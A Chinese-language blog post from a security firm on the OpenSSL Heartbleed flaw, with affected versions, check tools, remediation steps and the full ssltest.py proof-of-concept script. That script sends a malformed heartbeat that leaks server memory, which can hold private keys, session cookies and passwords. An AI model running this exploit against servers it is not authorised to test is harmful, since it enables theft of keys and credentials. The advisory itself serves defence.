
<!DOCTYPE html>
<html class="no-js " lang="zh-TW" xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#" xmlns:fb="http://www.facebook.com/2008/fbml">
  <head>
    <title>
      OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞  | DEVCORE 戴夫寇爾
    </title>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
    <meta name="description" property="og:description" content="OpenSSL 出現極嚴重漏洞 CVE-2014-0160，被稱為 Heartbleed。究竟是什麼漏洞嚴重到要稱為「心臟出血」呢？我的伺服器也跟著出血了嗎？越重要的函式庫越可能含有意想不到的嚴重漏洞，讓我們來看看這次 OpenSSL 出了什麼包！" />
    <meta name="keywords" content="openssl, heartbleed, cve-2014-0160" />
    <meta property="og:site_name" content="DEVCORE 戴夫寇爾" />
    <meta property="og:title" content="OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞  | DEVCORE 戴夫寇爾" />
    <meta property="og:url" content="http://devco.re/blog/2014/04/08/openssl-heartbleed-CVE-2014-0160/" />
    <meta property="og:type" content="website" />
    <meta property="og:image" content="" />
    <meta name="twitter:card" content="summary">
    <meta name="twitter:site" content="d3vc0r3">
    <meta name="twitter:title" content="OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞  | DEVCORE 戴夫寇爾">
    <meta name="twitter:description" content="OpenSSL 出現極嚴重漏洞 CVE-2014-0160，被稱為 Heartbleed。究竟是什麼漏洞嚴重到要稱為「心臟出血」呢？我的伺服器也跟著出血了嗎？越重要的函式庫越可能含有意想不到的嚴重漏洞，讓我們來看看這次 OpenSSL 出了什麼包！">
    <meta name="twitter:creator" content="d3vc0r3">
    <meta name="twitter:image:src" content="">
    <meta name="twitter:domain" content="devco.re">
    <meta name="google-site-verification" content="lMNi_XT6UmeGqeYI_vLHu5PDRi_uNVfnA2NdDGS4-lM" />
    <meta name="msvalidate.01" content="119FDBB7730BE45B162515BBB1FF6B33" />
    <meta name="alexaVerifyID" content="j-Es9N9SD7ckfA2EokOz9SZzhok" />
    <meta name='yandex-verification' content='4561963cf1d18fe3' />

    <link rel="canonical" href="http://devco.re/blog/2014/04/08/openssl-heartbleed-CVE-2014-0160/"/>
    <link rel="alternate" type=application/rss+xml title="DEVCORE 戴夫寇爾" href="http://devco.re/rss">
    <link rel="publisher" href="https://plus.google.com/118439315679478709768/" />

    <link href="/assets/themes/devcore/images/favicon.png" rel="icon" size="32x32">
    <link href="/assets/themes/devcore/stylesheets/all.min.css" media="screen" rel="stylesheet" type="text/css" />
    <!--[if lt IE 9]><link href="/stylesheets/ie8.css" media="screen" rel="stylesheet" type="text/css" /><![endif]--><!--[if lt IE 9]><script src="//html5shim.googlecode.com/svn/trunk/html5.js" type="text/javascript"></script><![endif]-->
  </head>
  <body class="off-canvas" data-offset="48" data-spy="scroll" data-target=".quick-nav">
    <div class="wrapper">
      <div class="outside">
        <div class="page-width">
          <div class="close-menu-btn-wrapper">
            <div class="close-menu-btn-wrapper-inner">
              <a class="close-menu-btn" href="#close-menu">×</a>
            </div>
          </div>
        </div>
        <div class="outside-inner">
          <div class="main-nav" data-set="main-nav">
            <ul>
              <li>
                <a href="/services/penetration-test" title="滲透測試 Penetration Test">
                  <div class="zh">
                    服務
                  </div>
                  <div class="en">
                    Services
                  </div>
                </a>
                <ul>
                  <li>
                    <a href="/services/penetration-test" title="滲透測試 Penetration Test">
                      <div class="zh">
                        滲透測試
                      </div>
                      <div class="en">
                        Penetration Test
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="/services/security-training" title="資安教育訓練 Security Training">
                      <div class="zh">
                        資安教育訓練
                      </div>
                      <div class="en">
                        Security Training
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="/services/incident-response" title="資安事件處理 Incident Response">
                      <div class="zh">
                        資安事件處理
                      </div>
                      <div class="en">
                        Incident Response
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="/services/security-consulting" title="資安顧問服務 Security Consulting">
                      <div class="zh">
                        資安顧問服務
                      </div>
                      <div class="en">
                        Security Consulting
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="/services/security-seal" title="網站安全標章 Security Seal">
                      <div class="zh">
                        網站安全標章
                      </div>
                      <div class="en">
                        Security Seal
                      </div>
                    </a>
                  </li>
                </ul>
              </li>
              <li>
                <a href="/blog/" title="部落格 Blog">
                  <div class="zh">
                    部落格
                  </div>
                  <div class="en">
                    Blog
                  </div>
                </a>
                <ul>
                  <li>
                    <a href="/blog/category/%E6%9C%80%E6%96%B0%E6%B6%88%E6%81%AF/" title="最新消息 News">
                      <div class="zh">
                        最新消息
                      </div>
                      <div class="en">
                        News
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="/blog/category/%E6%A1%88%E4%BE%8B%E5%89%96%E6%9E%90/" title="案例剖析 Case Study">
                      <div class="zh">
                        案例剖析
                      </div>
                      <div class="en">
                        Case Study
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="/blog/category/%E6%8A%80%E8%A1%93%E5%B0%88%E6%AC%84/" title="技術專欄 Techincal">
                      <div class="zh">
                        技術專欄
                      </div>
                      <div class="en">
                        Techincal
                      </div>
                    </a>
                  </li>
                  <li>
                    <a href="/blog/category/%E7%A7%91%E6%99%AE%E6%96%87%E7%AB%A0/" title="科普文章 For Muggle">
                      <div class="zh">
                        科普文章
                      </div>
                      <div class="en">
                        For Muggle
                      </div>
                    </a>
                  </li>
                </ul>
              </li>
              <li>
                <a href="/about/" title="關於 About">
                  <div class="zh">
                    關於
                  </div>
                  <div class="en">
                    About
                  </div>
                </a>
              </li>
              <li>
                <a href="/contact/" title="聯絡 Contact">
                  <div class="zh">
                    聯絡
                  </div>
                  <div class="en">
                    Contact
                  </div>
                </a>
              </li>
              <li>
                <a href="/partners/" title="合作夥伴 Partners">
                  <div class="zh">
                    合作夥伴
                  </div>
                  <div class="en">
                    Partners
                  </div>
                </a>
              </li>
            </ul>
          </div>
        </div>
      </div>
      <div class="page">
        <div class="header">
          <div class="header-inner">
            <div class="main-nav" data-set="main-nav">
              <ul>
                <li>
                  <a href="/services/penetration-test" title="滲透測試 Penetration Test">Services</a>
                </li>
                <li>
                  <a href="/blog/" title="部落格 Blog">Blog</a>
                </li>
                <li>
                  <a href="/about/" title="關於 About">About</a>
                </li>
                <li>
                  <a href="/contact/" title="聯絡 Contact">Contact</a>
                </li>
                <li class="menu-button">
                  <a class="open-menu-btn" href="#open-menu">・・・</a>
                </li>
              </ul>
            </div>
            <h1 class="logo">
              <a href="/" title="DEVCORE 戴夫寇爾">OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞 </a>
            </h1>
          </div>
        </div>
        <div class="main">
          

          <div class="page-header">
            <div class="container">
              <h2 class="page-header-title">
                部落格 <small> Blog </small>
              </h2>
            </div>
          </div>
          <div class="page-content">
            <div class="container">
              <div class="post">
                <div class="post-main">
                  <div class="post-switch">
                    <a class="prev" href="/blog/2014/03/31/Google-Account-Phishing-Scam/" title="Google 帳號釣魚案例">上一篇文章</a>
                    <a class="next" href="/blog/2014/04/08/security-issues-of-http-headers-2-content-security-policy/" title="HTTP Headers 的資安議題 (2) - Content-Security-Policy">下一篇文章</a>
                  </div>
                  <div itemscope itemtype="http://schema.org/Article" class="post-content">
                    <h2 itemprop="name" class="post-title">
                      OpenSSL CVE-2014-0160 Heartbleed 嚴重漏洞 
                    </h2>
                    <div class="post-info">
                      <span class="post-category"><a href="/blog/category/技術專欄/">技術專欄</a></span><span class="posted">Posted </span>by <a class="poster" href="#"><span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">allenown</span></span></a>on <span class="post-time" itemprop="datePublished" content="2014-04-08">2014-04-08</span>
                    </div>
                    <div class="post-tag">
                      
                      Tags: <a href="/blog/tag/openssl/">openssl</a>, <a href="/blog/tag/vulnerability/">vulnerability</a>
                    </div>
                    <span itemprop="articleBody">
                      <h3 id="openssl_cve20140160_">OpenSSL CVE-2014-0160 嚴重漏洞</h3>

<p>OpenSSL 今天公告了一個極度嚴重的漏洞（<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160">CVE-2014-0160</a>），被稱為「<a href="http://heartbleed.com/">Heartbleed</a>」，而他確實也如同心臟噴出血般嚴重。這個漏洞能讓攻擊者從伺服器記憶體中讀取 64 KB 的資料，利用傳送 heartbeat 的封包給伺服器，在封包中控制變數導致 memcpy 函數複製錯誤的記憶體資料，因而擷取記憶體中可能存在的機敏資料。記憶體中最嚴重可能包含 ssl private key、session cookie、使用者密碼等，因此可能因為這樣的漏洞導致伺服器遭到入侵或取得使用者帳號。</p>

<p>詳細的分析可以參閱 <a href="http://blog.existentialize.com/diagnosis-of-the-openssl-heartbleed-bug.html">existential type crisis : Diagnosis of the OpenSSL Heartbleed Bug</a></p>

<ul>
<li>軟體名稱：OpenSSL</li>

<li>影響範圍：1.0.1 至 1.0.1f / 1.0.2-beta</li>

<li>修復版本：1.0.1g / 1.0.2-beta1</li>
</ul>

<p>OpenSSL 的公告如下：<a href="https://www.openssl.org/news/secadv_20140407.txt">https://www.openssl.org/news/secadv_20140407.txt</a></p>

<p>”’ A missing bounds check in the handling of the TLS heartbeat extension can be used to reveal up to 64k of memory to a connected client or server.</p>

<p>Only 1.0.1 and 1.0.2-beta releases of OpenSSL are affected including 1.0.1f and 1.0.2-beta1. ”’</p>

<h3 id="">如何自我檢測？</h3>

<p>要如何測試自己的網站有沒有這樣的漏洞呢？可以利用以下的網站或工具直接查詢。</p>

<ul>
<li>Heartbleed test <a href="http://filippo.io/Heartbleed/">http://filippo.io/Heartbleed/</a></li>
</ul>

<p>直接輸入 Domain 即可查詢，例如「fbi.gov」。</p>

<p><a href="https://lh5.googleusercontent.com/-eZWKW24FMRM/U0QjWVEvSlI/AAAAAAAAAQc/tG8bOO00NCg/s2560/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png"><img src="https://lh5.googleusercontent.com/-eZWKW24FMRM/U0QjWVEvSlI/AAAAAAAAAQc/tG8bOO00NCg/w897-h678-no/2014-04-08-openssl-heartbleed-CVE-2014-0160-01-fbi.gov.png" alt="OpenSSL CVE-2014-0160 Heartbleed 檢測: fbi.gov" title="OpenSSL CVE-2014-0160 Heartbleed 檢測: fbi.gov" /></a></p>

<ul>
<li>自我測試工具 <a href="http://s3.jspenguin.org/ssltest.py">http://s3.jspenguin.org/ssltest.py</a></li>
</ul>

<p>使用方法直接執行「python ssltest.py ifttt.com」，或是用「-p」指定特定 SSL 連接埠。畫面上會顯示出記憶體資料，可能內含機敏資料例如 private key、session cookie 等。</p>

<p><a href="https://lh4.googleusercontent.com/-jg8rcJJH8XQ/U0QjWVrjuBI/AAAAAAAAAQY/zMe-rUVImvI/s2560/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png"><img src="https://lh4.googleusercontent.com/-jg8rcJJH8XQ/U0QjWVrjuBI/AAAAAAAAAQY/zMe-rUVImvI/w509-h677-no/2014-04-08-openssl-heartbleed-CVE-2014-0160-02-ifttt.png" alt="OpenSSL CVE-2014-0160 Heartbleed 檢測: ifttt.com" title="OpenSSL CVE-2014-0160 Heartbleed 檢測: ifttt.com" /></a></p>

<p>原始碼如下：</p>
<div class='highlight'><pre><code class='python'><span class='c'>#!/usr/bin/python</span>

<span class='c'># Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)</span>
<span class='c'># The author disclaims copyright to this source code.</span>

<span class='kn'>import</span> <span class='nn'>sys</span>
<span class='kn'>import</span> <span class='nn'>struct</span>
<span class='kn'>import</span> <span class='nn'>socket</span>
<span class='kn'>import</span> <span class='nn'>time</span>
<span class='kn'>import</span> <span class='nn'>select</span>
<span class='kn'>import</span> <span class='nn'>re</span>
<span class='kn'>from</span> <span class='nn'>optparse</span> <span class='kn'>import</span> <span class='n'>OptionParser</span>

<span class='n'>options</span> <span class='o'>=</span> <span class='n'>OptionParser</span><span class='p'>(</span><span class='n'>usage</span><span class='o'>=</span><span class='s'>&#39;%prog server [options]&#39;</span><span class='p'>,</span> <span class='n'>description</span><span class='o'>=</span><span class='s'>&#39;Test for SSL heartbeat vulnerability (CVE-2014-0160)&#39;</span><span class='p'>)</span>
<span class='n'>options</span><span class='o'>.</span><span class='n'>add_option</span><span class='p'>(</span><span class='s'>&#39;-p&#39;</span><span class='p'>,</span> <span class='s'>&#39;--port&#39;</span><span class='p'>,</span> <span class='nb'>type</span><span class='o'>=</span><span class='s'>&#39;int&#39;</span><span class='p'>,</span> <span class='n'>default</span><span class='o'>=</span><span class='mi'>443</span><span class='p'>,</span> <span class='n'>help</span><span class='o'>=</span><span class='s'>&#39;TCP port to test (default: 443)&#39;</span><span class='p'>)</span>

<span class='k'>def</span> <span class='nf'>h2bin</span><span class='p'>(</span><span class='n'>x</span><span class='p'>):</span>
    <span class='k'>return</span> <span class='n'>x</span><span class='o'>.</span><span class='n'>replace</span><span class='p'>(</span><span class='s'>&#39; &#39;</span><span class='p'>,</span> <span class='s'>&#39;&#39;</span><span class='p'>)</span><span class='o'>.</span><span class='n'>replace</span><span class='p'>(</span><span class='s'>&#39;</span><span class='se'>\n</span><span class='s'>&#39;</span><span class='p'>,</span> <span class='s'>&#39;&#39;</span><span class='p'>)</span><span class='o'>.</span><span class='n'>decode</span><span class='p'>(</span><span class='s'>&#39;hex&#39;</span><span class='p'>)</span>

<span class='n'>hello</span> <span class='o'>=</span> <span class='n'>h2bin</span><span class='p'>(</span><span class='s'>&#39;&#39;&#39;</span>
<span class='s'>16 03 02 00  dc 01 00 00 d8 03 02 53</span>
<span class='s'>43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf</span>
<span class='s'>bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00</span>
<span class='s'>00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88</span>
<span class='s'>00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c</span>
<span class='s'>c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09</span>
<span class='s'>c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44</span>
<span class='s'>c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c</span>
<span class='s'>c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11</span>
<span class='s'>00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04</span>
<span class='s'>03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19</span>
<span class='s'>00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08</span>
<span class='s'>00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13</span>
<span class='s'>00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00</span>
<span class='s'>00 0f 00 01 01                                  </span>
<span class='s'>&#39;&#39;&#39;</span><span class='p'>)</span>

<span class='n'>hb</span> <span class='o'>=</span> <span class='n'>h2bin</span><span class='p'>(</span><span class='s'>&#39;&#39;&#39; </span>
<span class='s'>18 03 02 00 03</span>
<span class='s'>01 40 00</span>
<span class='s'>&#39;&#39;&#39;</span><span class='p'>)</span>

<span class='k'>def</span> <span class='nf'>hexdump</span><span class='p'>(</span><span class='n'>s</span><span class='p'>):</span>
    <span class='k'>for</span> <span class='n'>b</span> <span class='ow'>in</span> <span class='nb'>xrange</span><span class='p'>(</span><span class='mi'>0</span><span class='p'>,</span> <span class='nb'>len</span><span class='p'>(</span><span class='n'>s</span><span class='p'>),</span> <span class='mi'>16</span><span class='p'>):</span>
        <span class='n'>lin</span> <span class='o'>=</span> <span class='p'>[</span><span class='n'>c</span> <span class='k'>for</span> <span class='n'>c</span> <span class='ow'>in</span> <span class='n'>s</span><span class='p'>[</span><span class='n'>b</span> <span class='p'>:</span> <span class='n'>b</span> <span class='o'>+</span> <span class='mi'>16</span><span class='p'>]]</span>
        <span class='n'>hxdat</span> <span class='o'>=</span> <span class='s'>&#39; &#39;</span><span class='o'>.</span><span class='n'>join</span><span class='p'>(</span><span class='s'>&#39;</span><span class='si'>%02X</span><span class='s'>&#39;</span> <span class='o'>%</span> <span class='nb'>ord</span><span class='p'>(</span><span class='n'>c</span><span class='p'>)</span> <span class='k'>for</span> <span class='n'>c</span> <span class='ow'>in</span> <span class='n'>lin</span><span class='p'>)</span>
        <span class='n'>pdat</span> <span class='o'>=</span> <span class='s'>&#39;&#39;</span><span class='o'>.</span><span class='n'>join</span><span class='p'>((</span><span class='n'>c</span> <span class='k'>if</span> <span class='mi'>32</span> <span class='o'>&lt;=</span> <span class='nb'>ord</span><span class='p'>(</span><span class='n'>c</span><span class='p'>)</span> <span class='o'>&lt;=</span> <span class='mi'>126</span> <span class='k'>else</span> <span class='s'>&#39;.&#39;</span> <span class='p'>)</span><span class='k'>for</span> <span class='n'>c</span> <span class='ow'>in</span> <span class='n'>lin</span><span class='p'>)</span>
        <span class='k'>print</span> <span class='s'>&#39;  </span><span class='si'>%04x</span><span class='s'>: </span><span class='si'>%-48s</span><span class='s'> </span><span class='si'>%s</span><span class='s'>&#39;</span> <span class='o'>%</span> <span class='p'>(</span><span class='n'>b</span><span class='p'>,</span> <span class='n'>hxdat</span><span class='p'>,</span> <span class='n'>pdat</span><span class='p'>)</span>
    <span class='k'>print</span>

<span class='k'>def</span> <span class='nf'>recvall</span><span class='p'>(</span><span class='n'>s</span><span class='p'>,</span> <span class='n'>length</span><span class='p'>,</span> <span class='n'>timeout</span><span class='o'>=</span><span class='mi'>5</span><span class='p'>):</span>
    <span class='n'>endtime</span> <span class='o'>=</span> <span class='n'>time</span><span class='o'>.</span><span class='n'>time</span><span class='p'>()</span> <span class='o'>+</span> <span class='n'>timeout</span>
    <span class='n'>rdata</span> <span class='o'>=</span> <span class='s'>&#39;&#39;</span>
    <span class='n'>remain</span> <span class='o'>=</span> <span class='n'>length</span>
    <span class='k'>while</span> <span class='n'>remain</span> <span class='o'>&gt;</span> <span class='mi'>0</span><span class='p'>:</span>
        <span class='n'>rtime</span> <span class='o'>=</span> <span class='n'>endtime</span> <span class='o'>-</span> <span class='n'>time</span><span class='o'>.</span><span class='n'>time</span><span class='p'>()</span> 
        <span class='k'>if</span> <span class='n'>rtime</span> <span class='o'>&lt;</span> <span class='mi'>0</span><span class='p'>:</span>
            <span class='k'>return</span> <span class='bp'>None</span>
        <span class='n'>r</span><span class='p'>,</span> <span class='n'>w</span><span class='p'>,</span> <span class='n'>e</span> <span class='o'>=</span> <span class='n'>select</span><span class='o'>.</span><span class='n'>select</span><span class='p'>([</span><span class='n'>s</span><span class='p'>],</span> <span class='p'>[],</span> <span class='p'>[],</span> <span class='mi'>5</span><span class='p'>)</span>
        <span class='k'>if</span> <span class='n'>s</span> <span class='ow'>in</span> <span class='n'>r</span><span class='p'>:</span>
            <span class='n'>data</span> <span class='o'>=</span> <span class='n'>s</span><span class='o'>.</span><span class='n'>recv</span><span class='p'>(</span><span class='n'>remain</span><span class='p'>)</span>
            <span class='c'># EOF?</span>
            <span class='k'>if</span> <span class='ow'>not</span> <span class='n'>data</span><span class='p'>:</span>
                <span class='k'>return</span> <span class='bp'>None</span>
            <span class='n'>rdata</span> <span class='o'>+=</span> <span class='n'>data</span>
            <span class='n'>remain</span> <span class='o'>-=</span> <span class='nb'>len</span><span class='p'>(</span><span class='n'>data</span><span class='p'>)</span>
    <span class='k'>return</span> <span class='n'>rdata</span>
        

<span class='k'>def</span> <span class='nf'>recvmsg</span><span class='p'>(</span><span class='n'>s</span><span class='p'>):</span>
    <span class='n'>hdr</span> <span class='o'>=</span> <span class='n'>recvall</span><span class='p'>(</span><span class='n'>s</span><span class='p'>,</span> <span class='mi'>5</span><span class='p'>)</span>
    <span class='k'>if</span> <span class='n'>hdr</span> <span class='ow'>is</span> <span class='bp'>None</span><span class='p'>:</span>
        <span class='k'>print</span> <span class='s'>&#39;Unexpected EOF receiving record header - server closed connection&#39;</span>
        <span class='k'>return</span> <span class='bp'>None</span><span class='p'>,</span> <span class='bp'>None</span><span class='p'>,</span> <span class='bp'>None</span>
    <span class='n'>typ</span><span class='p'>,</span> <span class='n'>ver</span><span class='p'>,</span> <span class='n'>ln</span> <span class='o'>=</span> <span class='n'>struct</span><span class='o'>.</span><span class='n'>unpack</span><span class='p'>(</span><span class='s'>&#39;&gt;BHH&#39;</span><span class='p'>,</span> <span class='n'>hdr</span><span class='p'>)</span>
    <span class='n'>pay</span> <span class='o'>=</span> <span class='n'>recvall</span><span class='p'>(</span><span class='n'>s</span><span class='p'>,</span> <span class='n'>ln</span><span class='p'>,</span> <span class='mi'>10</span><span class='p'>)</span>
    <span class='k'>if</span> <span class='n'>pay</span> <span class='ow'>is</span> <span class='bp'>None</span><span class='p'>:</span>
        <span class='k'>print</span> <span class='s'>&#39;Unexpected EOF receiving record payload - server closed connection&#39;</span>
        <span class='k'>return</span> <span class='bp'>None</span><span class='p'>,</span> <span class='bp'>None</span><span class='p'>,</span> <span class='bp'>None</span>
    <span class='k'>print</span> <span class='s'>&#39; ... received message: type = </span><span class='si'>%d</span><span class='s'>, ver = </span><span class='si'>%04x</span><span class='s'>, length = </span><span class='si'>%d</span><span class='s'>&#39;</span> <span class='o'>%</span> <span class='p'>(</span><span class='n'>typ</span><span class='p'>,</span> <span class='n'>ver</span><span class='p'>,</span> <span class='nb'>len</span><span class='p'>(</span><span class='n'>pay</span><span class='p'>))</span>
    <span class='k'>return</span> <span class='n'>typ</span><span class='p'>,</span> <span class='n'>ver</span><span class='p'>,</span> <span class='n'>pay</span>

<span class='k'>def</span> <span class='nf'>hit_hb</span><span class='p'>(</span><span class='n'>s</span><span class='p'>):</span>
    <span class='n'>s</span><span class='o'>.</span><span class='n'>send</span><span class='p'>(</span><span class='n'>hb</span><span class='p'>)</span>
    <span class='k'>while</span> <span class='bp'>True</span><span class='p'>:</span>
        <span class='n'>typ</span><span class='p'>,</span> <span class='n'>ver</span><span class='p'>,</span> <span class='n'>pay</span> <span class='o'>=</span> <span class='n'>recvmsg</span><span class='p'>(</span><span class='n'>s</span><span class='p'>)</span>
        <span class='k'>if</span> <span class='n'>typ</span> <span class='ow'>is</span> <span class='bp'>None</span><span class='p'>:</span>
            <span class='k'>print</span> <span class='s'>&#39;No heartbeat response received, server likely not vulnerable&#39;</span>
            <span class='k'>return</span> <span class='bp'>False</span>

        <span class='k'>if</span> <span class='n'>typ</span> <span class='o'>==</span> <span class='mi'>24</span><span class='p'>:</span>
            <span class='k'>print</span> <span class='s'>&#39;Received heartbeat response:&#39;</span>
            <span class='n'>hexdump</span><span class='p'>(</span><span class='n'>pay</span><span class='p'>)</span>
            <span class='k'>if</span> <span class='nb'>len</span><span class='p'>(</span><span class='n'>pay</span><span class='p'>)</span> <span class='o'>&gt;</span> <span class='mi'>3</span><span class='p'>:</span>
                <span class='k'>print</span> <span class='s'>&#39;WARNING: server returned more data than it should - server is vulnerable!&#39;</span>
            <span class='k'>else</span><span class='p'>:</span>
                <span class='k'>print</span> <span class='s'>&#39;Server processed malformed heartbeat, but did not return any extra data.&#39;</span>
            <span class='k'>return</span> <span class='bp'>True</span>

        <span class='k'>if</span> <span class='n'>typ</span> <span class='o'>==</span> <span class='mi'>21</span><span class='p'>:</span>
            <span class='k'>print</span> <span class='s'>&#39;Received alert:&#39;</span>
            <span class='n'>hexdump</span><span class='p'>(</span><span class='n'>pay</span><span class='p'>)</span>
            <span class='k'>print</span> <span class='s'>&#39;Server returned error, likely not vulnerable&#39;</span>
            <span class='k'>return</span> <span class='bp'>False</span>

<span class='k'>def</span> <span class='nf'>main</span><span class='p'>():</span>
    <span class='n'>opts</span><span class='p'>,</span> <span class='n'>args</span> <span class='o'>=</span> <span class='n'>options</span><span class='o'>.</span><span class='n'>parse_args</span><span class='p'>()</span>
    <span class='k'>if</span> <span class='nb'>len</span><span class='p'>(</span><span class='n'>args</span><span class='p'>)</span> <span class='o'>&lt;</span> <span class='mi'>1</span><span class='p'>:</span>
        <span class='n'>options</span><span class='o'>.</span><span class='n'>print_help</span><span class='p'>()</span>
        <span class='k'>return</span>

    <span class='n'>s</span> <span class='o'>=</span> <span class='n'>socket</span><span class='o'>.</span><span class='n'>socket</span><span class='p'>(</span><span class='n'>socket</span><span class='o'>.</span><span class='n'>AF_INET</span><span class='p'>,</span> <span class='n'>socket</span><span class='o'>.</span><span class='n'>SOCK_STREAM</span><span class='p'>)</span>
    <span class='k'>print</span> <span class='s'>&#39;Connecting...&#39;</span>
    <span class='n'>sys</span><span class='o'>.</span><span class='n'>stdout</span><span class='o'>.</span><span class='n'>flush</span><span class='p'>()</span>
    <span class='n'>s</span><span class='o'>.</span><span class='n'>connect</span><span class='p'>((</span><span class='n'>args</span><span class='p'>[</span><span class='mi'>0</span><span class='p'>],</span> <span class='n'>opts</span><span class='o'>.</span><span class='n'>port</span><span class='p'>))</span>
    <span class='k'>print</span> <span class='s'>&#39;Sending Client Hello...&#39;</span>
    <span class='n'>sys</span><span class='o'>.</span><span class='n'>stdout</span><span class='o'>.</span><span class='n'>flush</span><span class='p'>()</span>
    <span class='n'>s</span><span class='o'>.</span><span class='n'>send</span><span class='p'>(</span><span class='n'>hello</span><span class='p'>)</span>
    <span class='k'>print</span> <span class='s'>&#39;Waiting for Server Hello...&#39;</span>
    <span class='n'>sys</span><span class='o'>.</span><span class='n'>stdout</span><span class='o'>.</span><span class='n'>flush</span><span class='p'>()</span>
    <span class='k'>while</span> <span class='bp'>True</span><span class='p'>:</span>
        <span class='n'>typ</span><span class='p'>,</span> <span class='n'>ver</span><span class='p'>,</span> <span class='n'>pay</span> <span class='o'>=</span> <span class='n'>recvmsg</span><span class='p'>(</span><span class='n'>s</span><span class='p'>)</span>
        <span class='k'>if</span> <span class='n'>typ</span> <span class='o'>==</span> <span class='bp'>None</span><span class='p'>:</span>
            <span class='k'>print</span> <span class='s'>&#39;Server closed connection without sending Server Hello.&#39;</span>
            <span class='k'>return</span>
        <span class='c'># Look for server hello done message.</span>
        <span class='k'>if</span> <span class='n'>typ</span> <span class='o'>==</span> <span class='mi'>22</span> <span class='ow'>and</span> <span class='nb'>ord</span><span class='p'>(</span><span class='n'>pay</span><span class='p'>[</span><span class='mi'>0</span><span class='p'>])</span> <span class='o'>==</span> <span class='mh'>0x0E</span><span class='p'>:</span>
            <span class='k'>break</span>

    <span class='k'>print</span> <span class='s'>&#39;Sending heartbeat request...&#39;</span>
    <span class='n'>sys</span><span class='o'>.</span><span class='n'>stdout</span><span class='o'>.</span><span class='n'>flush</span><span class='p'>()</span>
    <span class='n'>s</span><span class='o'>.</span><span class='n'>send</span><span class='p'>(</span><span class='n'>hb</span><span class='p'>)</span>
    <span class='n'>hit_hb</span><span class='p'>(</span><span class='n'>s</span><span class='p'>)</span>

<span class='k'>if</span> <span class='n'>__name__</span> <span class='o'>==</span> <span class='s'>&#39;__main__&#39;</span><span class='p'>:</span>
    <span class='n'>main</span><span class='p'>()</span>
</code></pre></div>
<h3 id="_2">應對措施</h3>

<p>如果發現自己的伺服器有這樣的漏洞，該怎麼辦呢？</p>

<ol>
<li>確認自己的 OpenSSL 版本是否在受害範圍</li>

<li>使用 ssltest.py 檢測工具檢測是否含有漏洞</li>

<li>更新 OpenSSL 至 1.0.1g 或 1.0.2-beta2</li>

<li>重開所有與 OpenSSL 函式庫相關之服務</li>

<li>重新產生 SSL Private Key (因為 Private Key 可能藉由漏洞外洩)</li>

<li>將網站舊憑證撤銷</li>

<li>清除所有目前網頁伺服器上的 Session （因為可能遭到竊取）</li>

<li>必要時更換網站內使用者密碼，或是密切追蹤網站是否有帳號盜用的情況發生</li>
</ol>

<p>詳細討論與建議可以參考 Heartbleed: What is it and what are options to mitigate it? <a href="http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it">http://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it</a></p>

<h3 id="_3">誰會是目標呢？</h3>

<p>真的會有攻擊者利用這樣的攻擊手法嗎？目前在<a href="http://wooyun.org">烏雲 wooyun</a>平台上已經滿滿的資安研究員開始回報網站含有 OpenSSL 漏洞。也有駭客在嘗試撰寫更有效的攻擊利用程式，想要藉此把平常打不下來的網站一舉攻陷。</p>

<p>怎樣的站台會是重點目標呢？含有會員機制的網站特別如此，例如 Web Mail、社群網站等等。因此不少企業要多注意了，例如全世界最大的社群網站 Facebook、SlideShare、台灣知名電信公司網站、社交平台、網路銀行、NAS，都會在這波的攻擊範圍之內。如果沒有儘速修復，等到更有效的攻擊程式出現，就真的等著失血了。</p>

<h3 id="_4">小結</h3>

<p>就連 OpenSSL 這種歷史悠久而且重要的函式庫，都可能犯這種基本的 C 語言程式設計錯誤，老舊的程式碼一定有不少陳年遺毒，如果沒有徹底清查，類似的心臟噴血事件會不斷上演。大家快點止血吧！</p>
                    </span>
                    <div class="social-share" style="line-height: 10px; margin: 20px 0;">
                      <div style="float: right;">
                        <div class="fb-like" data-href="http://devco.re/blog/2014/04/08/openssl-heartbleed-CVE-2014-0160/" data-layout="button_count" data-action="like" data-show-faces="false" data-share="false"></div>
                      </div>
                      <a href="#" style="dispaly:none; border-bottom:none;"> </a>
                      <a href="https://twitter.com/share?" class="twitter-share-button">Tweet</a>
                      <div class="g-plusone" data-size="medium"></div>
                      <script type="text/javascript">
                        (function() {
                          var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
                          po.src = 'https://apis.google.com/js/platform.js';
                          var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
                        })();
                      </script>
